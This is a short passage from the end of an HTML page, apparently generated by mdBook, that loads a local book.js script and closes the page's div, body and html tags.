        <script src="../../../book.js"></script>

        <!-- Custom JS scripts -->


    </div>
    </body>
</html>
